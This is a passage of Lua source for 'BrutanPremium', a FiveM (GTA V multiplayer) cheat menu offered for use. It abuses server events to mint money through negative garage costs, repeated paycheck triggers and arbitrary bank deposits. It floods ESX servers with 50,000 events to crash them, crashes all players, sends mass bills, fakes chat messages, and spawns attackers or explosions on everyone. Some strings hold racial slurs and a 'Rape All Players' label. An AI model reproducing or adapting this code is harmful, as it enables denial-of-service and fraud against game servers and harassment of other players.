                    [-2066285827] = 1.0,
                    [137902532] = 1.0,
                    [2828843422] = 1.0,
                    [984333226] = 1.0,
                    [3342088282] = 1.0,
                    [1785463520] = 1.0,
                    [1672152130] = 0,
                    [1198879012] = 1.0,
                    [171789620] = 1.0,
                    [3696079510] = 1.0,
                    [1834241177] = 1.0,
                    [3675956304] = 1.0,
                    [3249783761] = 1.0,
                    [-879347409] = 1.0,
                    [4019527611] = 1.0,
                    [1649403952] = 1.0,
                    [317205821] = 1.0,
                    [125959754] = 1.0,
                    [3173288789] = 1.0
                }
                if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
                    local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
                    _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
                    if cI[cJ] and cI[cJ] ~= 0 then
                        tv = 0
                        if GetFollowPedCamViewMode() ~= 4 then
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                tv = tv + 0.0
                            until tv >= cI[cJ]
                        else
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                if cI[cJ] > 0.0 then
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                else
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                end
                            until tv >= cI[cJ]
                        end
                    end
                end
            end

            if Oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntity(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end
    end)
Citizen.CreateThread(
    function()

        local currentTint = 1
        local selectedTint = 1

        BrutanPremium.CreateMenu("MainMenu", "BrutanPremium")
        BrutanPremium.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		BrutanPremium.CreateSubMenu("PedMenu", "SelfMenu", "Ped Menu")
        BrutanPremium.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        BrutanPremium.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        BrutanPremium.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        BrutanPremium.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
		BrutanPremium.CreateSubMenu('LulxDJ', 'MaliciousMenu', 'ESP Menu')
        BrutanPremium.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        BrutanPremium.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        BrutanPremium.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        BrutanPremium.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        BrutanPremium.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        BrutanPremium.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		BrutanPremium.CreateSubMenu("Hedit", "VehMenu", "Handling")
	    BrutanPremium.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
        BrutanPremium.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		BrutanPremium.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
        BrutanPremium.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Vehicle types')
        BrutanPremium.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Vehicle Options')
        BrutanPremium.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        BrutanPremium.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        BrutanPremium.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
		BrutanPremium.CreateSubMenu("AI", "MainMenu", "AI Menu")
        BrutanPremium.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        BrutanPremium.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        BrutanPremium.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        BrutanPremium.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        BrutanPremium.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        BrutanPremium.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        BrutanPremium.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        BrutanPremium.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        BrutanPremium.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        BrutanPremium.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        BrutanPremium.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        BrutanPremium.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        BrutanPremium.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
		BrutanPremium.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
        BrutanPremium.CreateSubMenu("performance", "LSC", "Performance Tuning")
        BrutanPremium.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        BrutanPremium.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        BrutanPremium.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
		BrutanPremium.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
        BrutanPremium.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
		BrutanPremium.CreateSubMenu("Credits", "SettingsMenu", "Credits")
for i, dA in pairs(bd) do 
                BrutanPremium.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
                BrutanPremium.CreateSubMenu("primary", dA.id, "Primary Paint") 
                BrutanPremium.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
                BrutanPremium.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
                BrutanPremium.CreateSubMenu("classic1", "primary", "Classic Paint") 
                BrutanPremium.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
                BrutanPremium.CreateSubMenu("matte1", "primary", "Matte Paint") 
                BrutanPremium.CreateSubMenu("metal1", "primary", "Metal Paint") 
                BrutanPremium.CreateSubMenu("classic2", "secondary", "Classic Paint") 
                BrutanPremium.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
                BrutanPremium.CreateSubMenu("matte2", "secondary", "Matte Paint") 
                BrutanPremium.CreateSubMenu("metal2", "secondary", "Metal Paint") 
                BrutanPremium.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
                BrutanPremium.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
                BrutanPremium.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
                BrutanPremium.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
            end 
        end
        for i, dA in pairs(be) do 
            BrutanPremium.CreateSubMenu(dA.id, "performance", dA.name) 
        end
    
        local SelectedPlayer
    
            while Enabled do
    
                local ped = PlayerPedId() 
                local veh = GetVehiclePedIsUsing(ped) 
                SetVehicleModKit(veh, 0) 
                for i, dA in pairs(bd) do
                    if BrutanPremium.IsMenuOpened("tunings") then
                        if b8 then
                            if ba == "neon" then 
                                local r, g, b = table.unpack(b9) 
                                SetVehicleNeonLightsColour(veh, r, g, b) 
                                SetVehicleNeonLightEnabled(veh, 0, bc) 
                                SetVehicleNeonLightEnabled(veh, 1, bc) 
                                SetVehicleNeonLightEnabled(veh, 2, bc) 
                                SetVehicleNeonLightEnabled(veh, 3, bc) 
                                b8 = false 
                                ba = -1 
                                b9 = -1 
                            elseif ba == "paint" then 
                                local dB, dC, dD, dA = table.unpack(b9) 
                                SetVehicleColours(veh, dB, dC) 
                                SetVehicleExtraColours(veh, dD, dA) 
                                b8 = false
                                ba = -1; 
                                b9 = -1
                            else 
                                if bc == "rm" then 
                                    RemoveVehicleMod(veh, ba) 
                                    b8 = false 
                                    ba = -1 
                                    b9 = -1
                                else 
                                    SetVehicleMod(veh, ba, b9, false) 
                                    b8 = false 
                                    ba = -1 
                                    b9 = -1 
                                end 
                            end 
                        end 
                    end
    
                    if BrutanPremium.IsMenuOpened(dA.id) then
                        if dA.id == "wheeltypes" then
                            if BrutanPremium.Button("Sport Wheels") then 
                                SetVehicleWheelType(veh, 0) 
                            elseif BrutanPremium.Button("Muscle Wheels") then 
                                SetVehicleWheelType(veh, 1) 
                            elseif BrutanPremium.Button("Lowrider Wheels") then 
                                SetVehicleWheelType(veh, 2) 
                            elseif BrutanPremium.Button("SUV Wheels") then 
                                SetVehicleWheelType(veh, 3) 
                            elseif BrutanPremium.Button("Offroad Wheels") then 
                                SetVehicleWheelType(veh, 4) 
                            elseif BrutanPremium.Button("Tuner Wheels") then 
                                SetVehicleWheelType(veh, 5) 
                            elseif BrutanPremium.Button("High End Wheels") then 
                                SetVehicleWheelType(veh, 7) 
                            end
                                
                            BrutanPremium.Display() 
                        elseif dA.id == "extra" then 
                            local dF = checkValidVehicleExtras() 
                            for i, dA in pairs(dF) do
                                if IsVehicleExtraTurnedOn(veh, i) then 
                                    pricestring = "Installed"
                                else 
                                    pricestring = "Not Installed"
                                end
                                if BrutanPremium.Button(dA.menuName, pricestring) then 
                                    SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) 
                                end 
                            end 
    
                            BrutanPremium.Display() 
                        elseif dA.id == "headlight" then
                            if BrutanPremium.Button("None") then 
                                SetVehicleHeadlightsColour(veh, -1) 
                            end
                            for dK, dA in pairs(bo) do 
                                tp = GetVehicleHeadlightsColour(veh) 
                                if tp == dA.id and not bg then 
                                    pricetext = "Installed"
                                else 
                                    if bg and tp == dA.id then 
                                        pricetext = "Previewing"
                                    else pricetext = "Not Installed"
                                    end 
                                end
                                head = GetVehicleHeadlightsColour(veh) 
                                if BrutanPremium.Button(dA.name, pricetext) then
                                    if not bg then 
                                        bi = "headlight"
                                        bk = false
                                        oldhead = GetVehicleHeadlightsColour(veh) 
                                        bh = table.pack(oldhead) 
                                        SetVehicleHeadlightsColour(veh, dA.id) 
                                        bg = true 
                                    elseif bg and head == dA.id then 
                                        ToggleVehicleMod(veh, 22, true) 
                                        SetVehicleHeadlightsColour(veh, dA.id) 
                                        bg = false; bi = -1; bh = -1 
                                    elseif bg and head ~= dA.id then 
                                        SetVehicleHeadlightsColour(veh, dA.id) bg = true 
                                    end 
                                end 
                            end
    
                                BrutanPremium.Display() 
                        elseif dA.id == "neon" then
                            if BrutanPremium.Button("None") then 
                                SetVehicleNeonLightsColour(veh, 255, 255, 255) 
                                SetVehicleNeonLightEnabled(veh, 0, false) 
                                SetVehicleNeonLightEnabled(veh, 1, false) 
                                SetVehicleNeonLightEnabled(veh, 2, false) 
                                SetVehicleNeonLightEnabled(veh, 3, false) 
                            end
                            for i, dA in pairs(colors) do 
                                colorr, colorg, colorb = table.unpack(dA) 
                                r, g, b = GetVehicleNeonLightsColour(veh) 
                                if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then 
                                    pricestring = "Installed"
                                else 
                                    if b8 and colorr == r and colorg == g and colorb == b then 
                                        pricestring = "Previewing"
                                    else 
                                        pricestring = "Not Installed"
                                    end 
                                end
                                if BrutanPremium.Button(i, pricestring) then
                                    if not b8 then 
                                        ba = "neon"
                                        bc = IsVehicleNeonLightEnabled(veh, 1) 
                                        oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) 
                                        b9 = table.pack(oldr, oldg, oldb) 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true) 
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = true 
                                    elseif b8 and colorr == r and colorg == g and colorb == b then 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true)
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = false 
                                        ba = -1 
                                        b9 = -1 
                                    elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true)
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = true 
                                    end 
                                end 
                            end
        
                            BrutanPremium.Display() 
                        elseif dA.id == "paint" then
                            if BrutanPremium.MenuButton("~r~→  ~s~Primary Paint", "primary") then 
                            elseif BrutanPremium.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then 
                            elseif BrutanPremium.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then 
                            end 
                            BrutanPremium.Display()
                        else 
                            local as = checkValidVehicleMods(dA.id) 
                            for dG, dH in pairs(as) do
                                if dH.menuName == "Stock" then 
                                    price = 0 
                                end
                                if dA.name == "Horns" then
                                    for dI, dJ in pairs(horns) do
                                        if dJ ==dG - 1 then 
                                            dH.menuName = dI 
                                        end 
                                    end 
                                end
                                if dH.menuName == "NULL" then 
                                    dH.menuname = "unknown"
                                end
                                if BrutanPremium.Button(dH.menuName, price) then
                                    if not b8 then 
                                        ba = dA.id
                                        b9 = GetVehicleMod(veh, dA.id) 
                                        b8 = true
                                        if dH.data.realIndex == -1 then 
                                            bc = "rm"
                                            RemoveVehicleMod(veh, dH.data.modid) 
                                            b8 = false 
                                            ba = -1 
                                            b9 = -1 
                                            bc = false
                                        else 
                                            bc = false 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                        end 
                                    elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then 
                                        b8 = false 
                                        ba = -1 
                                        b9 = -1 
                                        bc = false
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(veh, dH.data.modid)
                                        else 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                        end 
                                    elseif b8 and GetVehicleMod(veh, dA.id)  ~= dH.data.realIndex then
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(veh, dH.data.modid) 
                                            b8 = false 
                                            ba = -1 
                                            b9 = -1 
                                            bc = false
                                        else 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                            b8 = true 
                                        end 
                                    end 
                                end 
                            end 
                                        BrutanPremium.Display() 
                        end 
                    end 
                end
    
            for i, dA in pairs(be) do
                if BrutanPremium.IsMenuOpened(dA.id) then
                if GetVehicleMod(veh, dA.id) == 0 then pricestock = "Not Installed"
                price1 = "Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 1 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 2 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 3 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Installed"
                elseif GetVehicleMod(veh, dA.id) == -1 then pricestock = "Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
            end
            if BrutanPremium.Button("Stock "..dA.name, pricestock) then 
                SetVehicleMod(veh, dA.id, -1) 
            elseif BrutanPremium.Button(dA.name.." Upgrade 1", price1) then 
                SetVehicleMod(veh, dA.id, 0) 
            elseif BrutanPremium.Button(dA.name.." Upgrade 2", price2) then 
                SetVehicleMod(veh, dA.id, 1) 
            elseif BrutanPremium.Button(dA.name.." Upgrade 3", price3) then 
                SetVehicleMod(veh, dA.id, 2) 
            elseif dA.id ~= 13 and dA.id ~= 12 and BrutanPremium.Button(dA.name.." Upgrade 4", price4) then 
                SetVehicleMod(veh, dA.id, 3) end; BrutanPremium.Display() 
            end 
        end

            if BrutanPremium.IsMenuOpened("MainMenu") then
                drawNotification("~h~~r~Brutan ~s~Premium")
                drawNotification("~h~~s~BRUTAN ON YOUTUBE")
                if BrutanPremium.MenuButton    ("~r~→  ~s~Self Menu", "SelfMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Teleport Menu", "TeleportMenu") then
				elseif BrutanPremium.MenuButton("~r~→  ~s~AI", "AI") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Online Players", "OnlinePlayersMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Weapon Menu", "WeaponMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Vehicle Menu", "VehMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Extreme Menu", "MaliciousMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Troll Menu", "TrollMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Options", "ESXMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~VRP Options", "VRPMenu") then
				elseif BrutanPremium.MenuButton("~r~→  ~s~Settings", "SettingsMenu") then
                elseif BrutanPremium.Button("~r~→  ~s~~r~Close The Menu  ←") then
                    Enabled = false
                end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("VRPMenu") then
                if BrutanPremium.Button("VRP PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif BrutanPremium.Button("VRP PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif BrutanPremium.Button("VRP PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif BrutanPremium.Button("VRP PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif BrutanPremium.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
				elseif BrutanPremium.Button("Give yourself 10x salary (VRP)") then
				a=1 repeat TriggerServerEvent('paycheck:salary') a=a+1 until (a>10)
				a=1 repeat TriggerServerEvent('paycheck:bonus') a=a+1 until (a>10)
                elseif BrutanPremium.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif BrutanPremium.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif BrutanPremium.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
                end

                BrutanPremium.Display()
			                elseif BrutanPremium.IsMenuOpened("SettingsMenu") then
                if BrutanPremium.ComboBox("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = selectedIndex
                    for i = 1, #allMenus do
                        BrutanPremium.SetMenuX(allMenus[i], menuX[currentMenuX])
                    end
                    end) 
                    then
                elseif BrutanPremium.ComboBox("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = selectedIndex
                    for i = 1, #allMenus do
                        BrutanPremium.SetMenuY(allMenus[i], menuY[currentMenuY])
                    end
                    end)
                    then
                    elseif BrutanPremium.CheckBox("~u~Discord~s~ Display", discordPresence, function(enabled) discordPresence = enabled end) then
					elseif BrutanPremium.MenuButton("~r~→  ~s~Information", "InfoMenu") then
                    elseif BrutanPremium.MenuButton("~r~→  ~s~Credits", "Credits") then
                    end
    
                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("InfoMenu") then
                    if BrutanPremium.Button("BrutanPremium") then
					elseif BrutanPremium.Button("https://discord.gg/8nSCR6u") then
                    end
    
                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("Credits") then
				if     BrutanPremium.Button("~h~Press on our names <3") then
				elseif BrutanPremium.Button("∑  ~r~~h~NEMESiS~s~ - ~r~DEV") then
				drawNotification('~h~Contact him for More releases.')
				drawNotification('~h~Also contact him if you want to purchase any menu.')
				elseif BrutanPremium.Button("∑  ~r~~h~Real Nigg~s~ - ~r~DEV") then
				elseif BrutanPremium.Button("∑  ~r~~h~Brutan~s~ - ~r~DEV") then
				end
					
					BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("TrollMenu") then
                if BrutanPremium.Button("ESX Server Crasher") then
                    for i = 1, 50000 do TriggerServerEvent("esx_skin:responseSaveSkin", {niggers = "gay"}) TriggerServerEvent("esx_skin:responseSaveSkin", "niggers eat shit") end
                elseif  BrutanPremium.CheckBox(
                    "Send everyone to jail",
                    banallusers,
                    function(enabled)
                    banallusers = enabled
                    end)
                then
				elseif BrutanPremium.Button("Spawn moutain Lion On Everyone") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif BrutanPremium.Button("SWAT W/ Railgun On Everyone") then
                    local swat = "s_m_y_swat_01"
					local bR = "weapon_railgun"
                    for i = 0, 128 do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif BrutanPremium.Button("Nuke Server") then
                    nukeserver()
				elseif BrutanPremium.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif BrutanPremium.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif BrutanPremium.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Brutan Premium, BRUTAN ON YOUTUBE", "99999999")
                end
				elseif BrutanPremium.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif BrutanPremium.Button("Rape All Players") then
                    RapeAllFunc()
                elseif BrutanPremium.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
                elseif BrutanPremium.Button('Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
				elseif BrutanPremium.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif BrutanPremium.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif BrutanPremium.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif BrutanPremium.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif BrutanPremium.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif BrutanPremium.Button("Fake Message") then
                    local da=KeyboardInput("Enter player name","",100)
                    if da then
                        local ck=KeyboardInput("Enter message","",1000)
                        if ck then
                            TriggerServerEvent("_chat:messageEntered",da,{0,0x99,255},ck)
                        end
                    end
                elseif BrutanPremium.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif BrutanPremium.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "mecano", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "mecano", 3)
                    end
                end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("TeleportMenu") then
                if BrutanPremium.Button("~b~TP~s~ To Your Waypoint") then
                    TeleportToWaypoint()
                elseif BrutanPremium.Button("~b~TP~s~ Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif BrutanPremium.Button("~b~TP~s~ To Coordinates") then
                    TeleportToCoords()
                elseif BrutanPremium.CheckBox(
                    "Show Your Coordinates",
                    showCoords,
                    function(enabled)
                        showCoords = enabled
                    end)
                then
                end

                BrutanPremium.Display()
			elseif BrutanPremium.IsMenuOpened("AI") then
			                if BrutanPremium.Button("~h~Configure The ~g~Speed") then
                    cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
					local c1 = 1.0
					cspeed = tonumber(cspeed)
					if cspeed == nil then
											drawNotification(
                            '~~r~Invalid Speed you dumbass~s~.'
                        )
                        drawNotification(
                            '~r~Operation cancelled~s~.'
                        )
                    elseif cspeed then
                        ojtgh = (cspeed .. ".0")
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(ojtgh))
                    end
					
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif BrutanPremium.Button("Drive to waypoint ~o~SLOW") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
